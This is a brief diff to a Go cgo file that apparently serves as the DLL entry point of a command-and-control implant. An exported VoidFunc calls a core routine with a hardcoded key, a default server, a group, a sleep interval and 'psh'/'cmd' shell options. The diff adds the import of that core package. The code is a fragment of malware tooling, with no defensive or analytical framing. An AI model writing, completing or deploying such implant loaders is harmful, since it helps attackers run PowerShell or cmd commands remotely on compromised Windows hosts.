@@ -1,6 +1,9 @@
 package main
 
 import "C"
+import (
+	"../core"
+)
 
 var (
 	key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
@@ -14,4 +17,4 @@ func VoidFunc() {
 	core.Core(defaultServer, defaultGroup, defaultSleep, []string{"psh","cmd"}, false)
 }
 
-func main() {} 
+func main() {}
